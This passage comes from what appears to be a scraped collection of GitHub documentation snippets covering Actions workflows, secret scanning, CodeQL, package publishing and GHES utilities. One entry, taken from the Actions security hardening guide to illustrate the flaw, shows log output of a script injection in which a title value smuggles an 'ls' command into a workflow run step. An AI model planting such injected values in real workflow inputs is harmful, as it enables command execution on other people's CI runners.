*not* match a custom secret scanning pattern due to failing to meet the specified length, character requirements, and forbidden substrings. It illustrates how the 'Secret format', 'After secret', and 'Additional requirements' work in combination to prevent false positives.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/using-advanced-secret-scanning-and-push-protection-features/custom-patterns/defining-custom-patterns-for-secret-scanning.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\na9@AA.!\na@AAAAA\naa9@AA!ee9\naAAAe9\n```\n\n----------------------------------------\n\nTITLE: Using the failure Status Check Function in GitHub Actions\nDESCRIPTION: This YAML snippet demonstrates the `failure()` function used within an `if` conditional. The `failure()` function returns `true` if any previous step in the current job (or any ancestor job in a chain of dependent jobs) has failed. This allows running specific steps, such as notifications or cleanup tasks, when a failure occurs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  ...\n  - name: The job has failed\n    if: {% raw %}${{ failure() }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Auditing Jenkins Pipelines\nDESCRIPTION: This snippet shows how to use the `audit` command to analyze Jenkins pipelines and generate a report summarizing the potential migration to GitHub Actions. The `--output-dir` flag specifies the directory for the audit report.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit jenkins --output-dir tmp/audit\n```\n\n----------------------------------------\n\nTITLE: Get Changed Files in Pull Request (Octokit.js)\nDESCRIPTION: This function retrieves all files changed in a given pull request using Octokit.js. It paginates through the API response to handle large pull requests. It takes owner, repo, and pullNumber as arguments and returns a list of filenames or logs an error if the request fails.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_18\n\nLANGUAGE: javascript\nCODE:\n```\nasync function getChangedFiles({owner, repo, pullNumber}) {\n  let filesChanged = []\n\n  try {\n    const iterator = octokit.paginate.iterator(\"GET /repos/{owner}/{repo}/pulls/{pull_number}/files\", {\n      owner: owner,\n      repo: repo,\n      pull_number: pullNumber,\n      per_page: 100,\n      headers: {\n        \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n      },\n    });\n\n    for await (const {data} of iterator) {\n      filesChanged = [...filesChanged, ...data.map(fileData => fileData.filename)];\n    }\n  } catch (error) {\n    if (error.response) {\n      console.error(`Error! Status: ${error.response.status}. Message: ${error.response.data.message}`)\n    }\n    console.error(error)\n  }\n\n  return filesChanged\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping Bamboo Environment Variables to GitHub Actions\nDESCRIPTION: This snippet demonstrates the mapping of Bamboo environment variables to their corresponding GitHub Actions equivalents using GitHub Actions expression syntax. These mappings are used by {% data variables.product.prodname_actions_importer %} during the conversion process. The variables represent runtime information like runner name, workspace, build identifiers, repository details, and user information. These expressions are evaluated during the execution of the GitHub Actions workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_17\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.runner_name }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.workspace }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.workflow }}-${{ github.job }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.run_id }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.repository }}-${{ github.workflow }}-${{ github.job }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.workflow }}-${{ github.job }}-${{ github.run_id }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.workspace }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.repository }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.actor }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.workflow }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.repository }}-${{ github.workflow }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.ref }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.ref }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.ref }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.repository }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.server }}/${{ github.repository }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.sha }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.actor}}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.ref }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.ref }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.server }}/${{ github.repository }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.event.pull_request.number }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.event.pull_request.head.ref }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.event.pull_request.base.ref }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.job }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.job }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.workflow }}\n```\n\nLANGUAGE: GitHub Actions\nCODE:\n```\n${{ github.workflow }}\n```\n\n----------------------------------------\n\nTITLE: Referencing Inputs and Secrets in Reusable Workflow - YAML\nDESCRIPTION: This snippet illustrates how to reference the defined inputs and secrets within the reusable workflow's jobs. The `secrets.personal_access_token` and `inputs.config-path` are used to configure the `actions/labeler` action. This demonstrates accessing the passed values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  reusable_workflow_job:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/labeler@v4\n      with:\n        repo-token: ${{ secrets.personal_access_token }}\n        configuration-path: ${{ inputs.config-path }}\n```\n\n----------------------------------------\n\nTITLE: Python Application Workflow (GHES)\nDESCRIPTION: This workflow defines a CI pipeline for a Python application, triggered on push and pull requests to the `main` branch. It sets up Python 3.13, installs dependencies, lints and formats the code using `ruff`, and runs tests using `pytest`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Python application\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Set up Python 3.13\n      uses: {% data reusables.actions.action-setup-python %}\n      with:\n        python-version: \"3.13\"\n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install ruff pytest\n        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi\n    - name: Lint and format Python code with ruff\n      run: |\n       # Lint with the default set of ruff rules with GitHub Annotations\n       ruff check --format=github --target-version=py39\n       # Verify the code is properly formatted\n       ruff format --diff --target-version=py39\n    - name: Test with pytest\n      run: |\n        pytest\n```\n\n----------------------------------------\n\nTITLE: Matrix Strategy for Multiple Ruby Versions\nDESCRIPTION: This YAML snippet demonstrates how to use a matrix strategy to test a Ruby project against multiple Ruby versions. The `ruby-version` array defines the Ruby versions to test against. The  `${{ matrix.ruby-version }}` context is used to access the current job's version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nstrategy:\n  matrix:\n    ruby-version: ['3.1', '3.0', '2.7']\n```\n\n----------------------------------------\n\nTITLE: Setting Default Shell and Working Directory in YAML\nDESCRIPTION: This YAML snippet demonstrates how to use `defaults.run` to set the default shell to `bash` and the default working directory to `./scripts` for all `run` steps in a workflow or a specific job. These settings will apply to all `run` commands within the workflow or job unless overridden. No contexts or expressions can be used in this keyword.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/setting-default-values-for-jobs-defaults-run.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ndefaults:\n  run:\n    shell: bash\n    working-directory: ./scripts\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for GitHub Packages Publishing (YAML)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that publishes a Java package to GitHub Packages. The workflow is triggered on `release` events of type `created`. It sets up Java and Gradle, then executes the `gradle publish` command, passing in the `GITHUB_TOKEN` as an environment variable retrieved from a GitHub secret. It also configures permissions to read contents and write packages. It depends on the `action-checkout`, `action-setup-java`, and `gradle/actions/setup-gradle` actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-gradle.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nname: Publish package to GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Setup Gradle\n        uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n      - name: Publish package\n        run: ./gradlew publish\n        env:\n          GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Customize Subject Claim: Reusable Workflow and Other Claims\nDESCRIPTION: This JSON template customizes the `sub` claim to include `repo`, `context`, and `job_workflow_ref`.  This enables restricting access based on repository, environment, and reusable workflow. The cloud provider OIDC configuration must be updated accordingly.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"include_claim_keys\": [\n       \"repo\",\n       \"context\",\n       \"job_workflow_ref\"\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing Repository Secret in YAML Workflow\nDESCRIPTION: This YAML snippet demonstrates how to reference a repository secret named `MY_TOKEN` within a GitHub Actions workflow file. The secret is accessed using the `secrets` context. The raw tags are used to ensure that the template expression is interpreted by the GitHub Actions runner, and not by the templating engine of the documentation site.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/storing-your-secrets-safely.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nGH_TOKEN: {% raw %}${{ secrets.MY_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_NODE_INDEX to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_NODE_INDEX` to the GitHub Actions equivalent `${{ strategy.job-index }}`. This represents the index of the current job within a parallel strategy.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_29\n\nLANGUAGE: YAML\nCODE:\n```\n${{ strategy.job-index }}\n```\n\n----------------------------------------\n\nTITLE: Define owner for apps directory and subdirectory with different owners\nDESCRIPTION: This snippet defines @octocat as the owner for the `/apps` directory, while @doctocat is the owner for the `/apps/github` subdirectory. Changes to `/apps` require @octocat's approval, and changes to `/apps/github` require @doctocat's approval.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n/apps/ @octocat\n/apps/github @doctocat\n```\n\n----------------------------------------\n\nTITLE: CodeQL Analysis with File Coverage Information\nDESCRIPTION: This example demonstrates how to include file coverage information in the CodeQL analysis results. The `--sarif-add-baseline-file-info` flag is added to the `codeql database analyze` command to include this information, allowing for display on the tool status page. Requires a CodeQL database at `/codeql-dbs/example-repo` and saves the output to `/temp/example-repo-js.sarif`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ codeql database analyze /codeql-dbs/example-repo \\\n    javascript-code-scanning.qls --sarif-category=javascript-typescript \\\n    --sarif-add-baseline-file-info \\ --format={% ifversion fpt or ghec %}sarif-latest{% else %}sarifv2.1.0{% endif %} \\\n    --output=/temp/example-repo-js.sarif\n```\n\n----------------------------------------\n\nTITLE: Using pre and post actions in YAML\nDESCRIPTION: This example configures `pre` and `post` actions for a JavaScript action in YAML. It shows how to run setup and cleanup scripts before and after the main action, respectively, using Node.js v20.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nruns:\n  using: 'node20'\n  pre: 'setup.js'\n  main: 'index.js'\n  post: 'cleanup.js'\n```\n\n----------------------------------------\n\nTITLE: Caching pnpm Dependencies in GitHub Actions (YAML)\nDESCRIPTION: This workflow caches pnpm dependencies using the `setup-node` action. It checks out the code, sets up pnpm using the `pnpm/action-setup` action, configures Node.js with caching enabled for pnpm, installs dependencies using `pnpm install`, and runs tests using `pnpm test`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n# NOTE: pnpm caching support requires pnpm version >= 6.10.0\n\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- uses: pnpm/action-setup@0609f0983b7a228f052f81ef4c3d6510cae254ad\n  with:\n    version: 6.10.0\n- uses: {% data reusables.actions.action-setup-node %}\n  with:\n    node-version: '20'\n    cache: 'pnpm'\n- run: pnpm install\n- run: pnpm test\n```\n\n----------------------------------------\n\nTITLE: Configuring Gemfile with Bundler to use GitHub Packages Registry (Ruby)\nDESCRIPTION: This code snippet demonstrates how to configure a Gemfile to use the GitHub Packages registry as a source for specific gems. It specifies the main rubygems.org source and then adds a source block for the GitHub Packages registry, scoped to a particular namespace. Replace `GEM_NAME` with the package name and `NAMESPACE` with the GitHub user or organization. The `REGISTRY_URL` needs to be configured for GHES environments.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nsource \"https://rubygems.org\"\n\ngem \"rails\"\n\nsource \"https://{% ifversion fpt or ghec %}rubygems.pkg.github.com{% else %}REGISTRY_URL{% endif %}/NAMESPACE\" do\n  gem \"GEM_NAME\"\nend\n```\n\n----------------------------------------\n\nTITLE: Updating an Iteration Field using GraphQL with gh\nDESCRIPTION: This snippet demonstrates how to update an iteration field for a project item using the GitHub CLI (`gh`) and GraphQL. It requires replacing `PROJECT_ID`, `ITEM_ID`, `FIELD_ID`, and `ITERATION_ID` with the appropriate values. The `gh` CLI handles authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_26\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  mutation {\\n    updateProjectV2ItemFieldValue(\\n      input: {\\n        projectId: \"PROJECT_ID\"\\n        itemId: \"ITEM_ID\"\\n        fieldId: \"FIELD_ID\"\\n        value: {\\n          iterationId: \"ITERATION_ID\"\\n        }\\n      }\\n    ) {\\n      projectV2Item {\\n        id\\n      }\\n    }\\n  }'\n```\n\n----------------------------------------\n\nTITLE: Associating Pull Requests with a Milestone in YAML\nDESCRIPTION: This YAML snippet shows how to associate Dependabot pull requests for npm dependencies with a specific milestone, identified by its numeric identifier.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/customizing-dependabot-prs.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n# Specify a milestone for pull requests\n\nversion: 2\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    # Associate pull requests with milestone \"4\"\n    milestone: 4\n```\n\n----------------------------------------\n\nTITLE: Creating JavaScript/TypeScript CodeQL Database\nDESCRIPTION: This example demonstrates creating a CodeQL database for JavaScript and TypeScript code. It creates a database at `/codeql-dbs/example-repo`, analyzes code from `/checkouts/example-repo`, and uses the JavaScript/TypeScript extractor.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ codeql database create /codeql-dbs/example-repo --language=javascript-typescript \\\n    --source-root /checkouts/example-repo\n\n> Initializing database at /codeql-dbs/example-repo.\n> Running command [/codeql-home/codeql/javascript/tools/autobuild.cmd]\n    in /checkouts/example-repo.\n> [build-stdout] Single-threaded extraction.\n> [build-stdout] Extracting\n...\n> Finalizing database at /codeql-dbs/example-repo.\n> Successfully created database at /codeql-dbs/example-repo.\n```\n\n----------------------------------------\n\nTITLE: Publishing to Maven Central Repository Workflow (YAML)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that publishes a Java package to the Maven Central Repository when a release is created.  It uses the `setup-java` action to configure Maven with the necessary authentication details for the `ossrh` repository and deploys the package. It assumes that `OSSRH_USERNAME` and `OSSRH_TOKEN` secrets are configured.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-maven.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Publish package to the Maven Central Repository\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Maven Central Repository\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n          server-id: ossrh\n          server-username: MAVEN_USERNAME\n          server-password: MAVEN_PASSWORD\n      - name: Publish package\n        run: mvn --batch-mode deploy\n        env:\n          MAVEN_USERNAME: {% raw %}${{ secrets.OSSRH_USERNAME }}{% endraw %}\n          MAVEN_PASSWORD: {% raw %}${{ secrets.OSSRH_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Generating GPG Key (v2.1.17+)\nDESCRIPTION: Generates a GPG key pair using the `gpg --full-generate-key` command. This command is applicable for GPG versions 2.1.17 and greater.  No dependencies are explicitly required beyond a working GPG installation.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/generating-a-new-gpg-key.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngpg --full-generate-key\n```\n\n----------------------------------------\n\nTITLE: Rust Workflow Template\nDESCRIPTION: This workflow builds and tests a Rust project on every push to the main branch and pull request. It uses the ubuntu-latest runner and performs a checkout, build, and test operation using cargo.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Rust\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n\nenv:\n  CARGO_TERM_COLOR: never\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Build\n      run: cargo build --verbose\n    - name: Run tests\n      run: cargo test --verbose\n```\n\n----------------------------------------\n\nTITLE: Using SHA value for GitHub Action versioning (YAML)\nDESCRIPTION: This snippet shows how to specify a GitHub Action version using a commit's full SHA value. Using SHA values ensures that a specific, immutable version of the action is used, but it requires manual updates to receive bug fixes and security patches.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/using-pre-written-building-blocks-in-your-workflow.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - uses: actions/javascript-action@a824008085750b8e136effc585c3cd6082bd575f\n```\n\n----------------------------------------\n\nTITLE: Building and Testing Swift Code\nDESCRIPTION: This snippet demonstrates how to build and test Swift code in a GitHub Actions workflow. It uses the `swift-actions/setup-swift` action to set up a specific Swift version, then builds the project using `swift build` and runs tests using `swift test`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf\n    with:\n      swift-version: \"5.3.3\"\n  - name: Build\n    run: swift build\n  - name: Run tests\n    run: swift test\n```\n\n----------------------------------------\n\nTITLE: Configure Git SSH commit signing\nDESCRIPTION: This snippet configures Git globally to use SSH for signing commits and tags.  It sets the `gpg.format` configuration option to `ssh`, which tells Git to use SSH keys instead of GPG keys for cryptographic signing.  This requires Git version 2.34 or later.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/configure-ssh-signing.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit config --global gpg.format ssh\n```\n\n----------------------------------------\n\nTITLE: Migrate with Configuration File for Reusable Workflows and Composite Actions\nDESCRIPTION: This command migrates Azure DevOps pipelines, using a configuration file to determine the target repository for converted reusable workflows and composite actions. It opens a pull request for each unique repository defined in the config file. It requires the path to the config file and the target repository URL.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer migrate azure-devops pipeline --config-file-path config.yml --target-url https://github.com/my-org/my-repo\n```\n\n----------------------------------------\n\nTITLE: Caching Dependencies\nDESCRIPTION: This snippet demonstrates how to cache dependencies using the `setup-go` action.  It configures the `setup-go` action to use a specified Go version ('1.17') and specifies `subdir/go.sum` as the dependency file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-go.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\n      - name: Setup Go\n        uses: {% data reusables.actions.action-setup-go %}\n        with:\n          go-version: '1.17'\n          cache-dependency-path: subdir/go.sum\n```\n\n----------------------------------------\n\nTITLE: JavaScript Comment for Code Suggestion\nDESCRIPTION: This JavaScript snippet illustrates how a comment can be used to generate code suggestions from GitHub Copilot in VS Code.  It shows a comment describing the desired code functionality, which Copilot then uses to create the appropriate code. This requires GitHub Copilot to be properly installed and configured in VS Code.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n// write a function to\n// find all images without alternate text\n// and give them a red border\n```\n\n----------------------------------------\n\nTITLE: Log Output: Shell Command Execution - Shell\nDESCRIPTION: This shell snippet shows the log output resulting from a script injection attack. The `ls` command is injected into the workflow and executed on the runner's workspace. The output demonstrates that the injected command (`ls $GITHUB_WORKSPACE`) was successfully executed, listing the files in the specified directory. This highlights the severity of the vulnerability.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nRun title=\"a\"; ls $GITHUB_WORKSPACE\"\"\nREADME.md\ncode.yml\nexample.js\n```\n\n----------------------------------------\n\nTITLE: Defining Job Outputs in GitHub Actions YAML\nDESCRIPTION: This YAML snippet demonstrates how to define job outputs using the `jobs.<job_id>.outputs` syntax. The `output1` and `output2` outputs are mapped to the `test` output of `step1` and `step2`, respectively.  Job2 depends on job1 and uses needs context to access job1's outputs. Requires the definition of job dependencies via `jobs.<job_id>.needs`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-defining-outputs-for-jobs.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job1:\n    runs-on: ubuntu-latest\n    # Map a step output to a job output\n    outputs:\n      output1: ${{ steps.step1.outputs.test }}\n      output2: ${{ steps.step2.outputs.test }}\n    steps:\n      - id: step1\n        run: echo \"test=hello\" >> \"$GITHUB_OUTPUT\"\n      - id: step2\n        run: echo \"test=world\" >> \"$GITHUB_OUTPUT\"\n  job2:\n    runs-on: ubuntu-latest\n    needs: job1\n    steps:\n      - env:\n          OUTPUT1: ${{needs.job1.outputs.output1}}\n          OUTPUT2: ${{needs.job1.outputs.output2}}\n        run: echo \"$OUTPUT1 $OUTPUT2\"\n```\n\n----------------------------------------\n\nTITLE: Pushing a Docker Image\nDESCRIPTION: This command pushes a Docker image to the GitHub Container Registry. NAMESPACE should be your user account or organization. IMAGE-NAME should be the name of the image. TAG should be the tag (e.g. latest).\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/connecting-a-repository-to-a-package.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ndocker push {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE-NAME:TAG\n```\n\n----------------------------------------\n\nTITLE: Retrieving Organization Members with GraphQL\nDESCRIPTION: This GraphQL query retrieves only the `name` and `avatarUrl` of organization members, avoiding the excessive data returned by the REST API. It specifies a limit of 100 members.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_1\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n    organization(login:\"github\") {\n    membersWithRole(first: 100) {\n      edges {\n        node {\n          name\n          avatarUrl\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Define owner for apps directory and exclude subdirectory\nDESCRIPTION: This snippet defines @octocat as the owner of files in the `/apps` directory, except for those in the `/apps/github` subdirectory. Changes to `/apps` require @octocat's approval, while `/apps/github` requires write access from any user.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n/apps/ @octocat\n/apps/github\n```\n\n----------------------------------------\n\nTITLE: Running scripts from repository in GitHub Actions workflow\nDESCRIPTION: This snippet demonstrates how to run scripts stored in the repository within a GitHub Actions workflow. It checks out the repository to the runner, sets a default working directory, and then executes the scripts using the `run` keyword.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/adding-scripts-to-your-workflow.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  example-job:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: ./scripts\n    steps:\n      - name: Check out the repository to the runner\n        uses: {% data reusables.actions.action-checkout %}  \n      - name: Run a script\n        run: ./my-script.sh\n      - name: Run another script\n        run: ./my-other-script.sh\n```\n\n----------------------------------------\n\nTITLE: Setting Multiline Environment Variable in Bash\nDESCRIPTION: This YAML configuration shows how to set a multiline environment variable in Bash. It defines `JSON_RESPONSE` using `EOF` as a delimiter and uses `curl` to fetch content from a URL. The result is then appended to `$GITHUB_ENV`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_36\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Set the value in bash\n    id: step_one\n    run: |\n      {\n        echo 'JSON_RESPONSE<<EOF'\n        curl https://example.com\n        echo EOF\n      } >> \"$GITHUB_ENV\"\n\n```\n\n----------------------------------------\n\nTITLE: Creating a GKE Cluster with gcloud\nDESCRIPTION: This command creates a Google Kubernetes Engine (GKE) cluster using the `gcloud` CLI. It requires the `GKE_CLUSTER`, `GKE_PROJECT`, and `GKE_ZONE` environment variables to be set with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ gcloud container clusters create $GKE_CLUSTER \\\n\t--project=$GKE_PROJECT \\\n\t--zone=$GKE_ZONE\n```\n\n----------------------------------------\n\nTITLE: Rolling SSH Host Keys with ghe-ssh-roll-host-keys (Shell)\nDESCRIPTION: The `ghe-ssh-roll-host-keys` utility rolls the SSH host keys, replacing them with newly generated keys. It prompts for confirmation unless the `-y` switch is used to bypass the prompt. Requires sudo privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_23\n\nLANGUAGE: shell\nCODE:\n```\n$ sudo ghe-ssh-roll-host-keys\nProceed with rolling SSH host keys? This will delete the\nexisting keys in /etc/ssh/ssh_host_* and generate new ones. [y/N]\n```\n\nLANGUAGE: shell\nCODE:\n```\n# Press 'Y' to confirm deleting, or use the -y switch to bypass this prompt\n```\n\nLANGUAGE: 